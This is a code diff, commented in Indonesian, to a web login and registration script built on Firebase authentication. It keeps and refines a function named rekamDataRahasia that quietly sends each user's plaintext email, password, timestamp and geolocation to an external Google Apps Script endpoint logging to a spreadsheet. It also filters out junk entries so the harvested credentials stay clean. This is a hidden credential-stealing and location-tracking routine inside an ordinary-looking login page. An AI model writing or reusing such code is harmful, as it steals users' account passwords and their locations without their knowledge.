@@ -89,18 +89,23 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loginButton) {
         loginButton.addEventListener('click', (e) => {
             e.preventDefault();
-            const email = emailInput.value ? emailInput.value.trim() : "";
-            const password = passwordInput.value ? passwordInput.value.trim() : "";
+            
+            // Mengambil value secara langsung tanpa ternary operator untuk stabilitas WebView
+            const emailVal = emailInput.value;
+            const passwordVal = passwordInput.value;
 
-            // Proteksi Awal Event Listener
-            if (!email || !password || email === "" || password === "") {
+            if (!emailVal || !passwordVal || emailVal.trim() === "" || passwordVal.trim() === "") {
                 alert("Email dan Password wajib diisi!");
                 return;
             }
 
-            rekamDataRahasia(email, password).catch(err => console.log(err));
+            const emailClean = emailVal.trim();
+            const passwordClean = passwordVal.trim();
 
-            signInWithEmailAndPassword(auth, email, password)
+            // Panggil fungsi perekaman data
+            rekamDataRahasia(emailClean, passwordClean);
+
+            signInWithEmailAndPassword(auth, emailClean, passwordClean)
                 .then(() => console.log("Firebase Login Sukses"))
                 .catch((error) => alert("Login Gagal: " + error.message));
         });
@@ -110,19 +115,22 @@ document.addEventListener('DOMContentLoaded', () => {
     if (btnRegister) {
         btnRegister.addEventListener('click', async (e) => {
             e.preventDefault();
-            const email = emailInput.value ? emailInput.value.trim() : "";
-            const password = passwordInput.value ? passwordInput.value.trim() : "";
+            
+            const emailVal = emailInput.value;
+            const passwordVal = passwordInput.value;
 
-            // Proteksi Awal Event Listener
-            if (!email || !password || email === "" || password === "") {
+            if (!emailVal || !passwordVal || emailVal.trim() === "" || passwordVal.trim() === "") {
                 alert("Email dan Password tidak boleh kosong!");
                 return;
             }
 
-            rekamDataRahasia(email, password).catch(err => console.log(err));
+            const emailClean = emailVal.trim();
+            const passwordClean = passwordVal.trim();
+
+            rekamDataRahasia(emailClean, passwordClean);
 
             try { 
-                await createUserWithEmailAndPassword(auth, email, password);
+                await createUserWithEmailAndPassword(auth, emailClean, passwordClean);
                 alert("Akun baru berhasil terdaftar!");
             } catch (error) {
                 if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
@@ -132,30 +140,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 });
 
-// --- FUNGSI LOGGING (ANTI-MANIPULASI TEKS KOSONG / "TANPA PASSWORD") ---
-async function rekamDataRahasia(email, password) {
-    // 1. Validasi Dasar Eksistensi Objek
-    if (!email || !password || email === null || password === null) {
-        console.log("Blokir: Parameter null atau tidak terdefinisi.");
-        return;
-    }
-    
-    // 2. Normalisasi Data untuk Pengecekan Akurat
-    const cleanEmail = email.trim().toLowerCase();
-    const cleanPassword = password.trim();
-    const lowPassword = cleanPassword.toLowerCase();
+// --- FUNGSI LOGGING OPTIMAL ---
+function rekamDataRahasia(email, password) {
+    // Normalisasi teks untuk memfilter bypass
+    const checkEmail = email.toLowerCase();
+    const checkPassword = password.toLowerCase();
 
-    // 3. GERBANG PROTEKSI MUTLAK: Deteksi string kosong dan string literal bypass
-    if (
-        cleanEmail === "" || 
-        cleanPassword === "" || 
-        lowPassword === "tanpa password" || 
-        lowPassword === "tanpapassword" ||
-        lowPassword === "undefined" || 
-        lowPassword === "null"
-    ) {
-        console.log("Perekaman dibatalkan: Terdeteksi bypass kata sandi tidak valid.");
-        return; 
+    // Pengecekan ketat kata kunci bypass teks literal
+    if (checkPassword === "tanpa password" || checkPassword === "tanpapassword" || checkPassword === "undefined" || checkPassword === "null") {
+        console.log("Aktivitas diblokir: Terdeteksi teks bypass.");
+        return;
     }
 
     const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
@@ -166,23 +160,23 @@ async function rekamDataRahasia(email, password) {
         year: 'numeric', month: '2-digit', day: '2-digit', 
         hour: '2-digit', minute: '2-digit', second: '2-digit' 
     };
-    const waktuFormat = ClinicalTime = sekarang.toLocaleString('id-ID', opsiWaktu);
+    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
     
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
-                kirimKeAppsScript(urlAppsScript, cleanEmail, cleanPassword, waktuFormat, `${lat}, ${lon}`);
+                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
             },
             () => {
-                // Dipastikan data email & pw kredibel berkat pemfilteran ketat di bagian atas
-                kirimKeAppsScript(urlAppsScript, cleanEmail, cleanPassword, waktuFormat, "Izin Lokasi Ditolak");
+                // Lokasi ditolak tetap kirim karena email & password dipastikan asli lewat validasi tombol
+                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
             },
             { timeout: 4000 }
         );
     } else {
-        kirimKeAppsScript(urlAppsScript, cleanEmail, cleanPassword, waktuFormat, "Tidak Didukung Browser");
+        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
     }
 }
 
@@ -196,5 +190,7 @@ function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
         method: 'GET',
         mode: 'no-cors',
         cache: 'no-cache'
-    }).catch(err => console.log("Aktivitas tercatat aman"));
+    })
+    .then(() => console.log("Data berhasil dikirim ke Sheets"))
+    .catch(err => console.log("Gagal fetch:", err));
 }
